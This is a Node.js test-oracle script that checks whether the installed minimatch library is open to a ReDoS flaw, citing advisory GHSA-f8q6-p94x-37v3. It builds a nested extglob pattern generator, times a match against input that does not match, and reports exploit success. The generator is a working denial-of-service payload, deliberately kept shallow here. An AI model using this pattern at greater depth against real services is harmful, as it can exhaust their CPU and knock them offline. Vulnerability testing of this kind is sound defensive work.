'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;

function buildPattern(n) {
  // Pattern shape known to cause catastrophic backtracking in minimatch's
  // extglob-to-regex conversion (qmark/star groups nested with commas),
  // based on the GHSA-f8q6-p94x-37v3 advisory reproduction shape.
  // We nest star-extglob groups containing comma-separated alternatives.
  let inner = 'a';
  for (let i = 0; i < n; i++) {
    inner = '+(' + inner + '|' + inner + ')';
  }
  return inner;
}

try {
  // Benign operation: prove the API works with a simple extglob pattern.
  const benignSubject = 'aaaaaaaaaa';
  const benignPattern = '*(a)';
  const benignResult = minimatch(benignSubject, benignPattern);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Baseline: small nesting depth, same pattern shape, used as a timing
  // reference. This should be fast on both vulnerable and fixed versions.
  const baselineN = 6;
  const baselinePattern = buildPattern(baselineN);
  const baselineSubject = 'a'.repeat(baselineN + 2) + 'X'; // non-matching

  const baselineStart = process.hrtime.bigint();
  let baselineThrew = false;
  try {
    minimatch(baselineSubject, baselinePattern);
  } catch (e) {
    baselineThrew = true;
  }
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  // Malicious: moderately larger nesting depth of the same shape.
  // Chosen small enough that even the vulnerable regex engine completes
  // within a few seconds, while still exhibiting a clear superlinear
  // (exponential-leaning) slowdown relative to the baseline.
  const N = 11;
  const maliciousPattern = buildPattern(N);
  const maliciousSubject = 'a'.repeat(N + 2) + 'X'; // non-matching, forces backtracking

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  let errMsg = '';
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
    errMsg = String(e && e.message);
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  // The growth in nesting depth from baselineN to N is (N - baselineN) = 5
  // additional nested +(x|x) groups, each roughly doubling the alternation
  // space in the vulnerable backtracking engine. We require the elapsed
  // time to be both absolutely non-trivial and vastly disproportionate to
  // the baseline's scaled linear expectation.
  const absoluteThresholdMs = 800; // vulnerable case should clearly exceed this
  const relativeSlowdownFactor = 50; // vulnerable call should be vastly slower than baseline
  const safeBaselineMs = Math.max(baselineMs, 0.05);

  let exploit_succeeded;
  let evidence;

  if (!threw && elapsedMs > absoluteThresholdMs && elapsedMs > safeBaselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call with nested extglob pattern (depth ' + N + ') took ' + elapsedMs.toFixed(2) + 'ms vs baseline (depth ' + baselineN + ') ' + baselineMs.toFixed(3) + 'ms (threshold ' + absoluteThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2) + ' err=' + errMsg;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed quickly (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no disproportionate slowdown observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
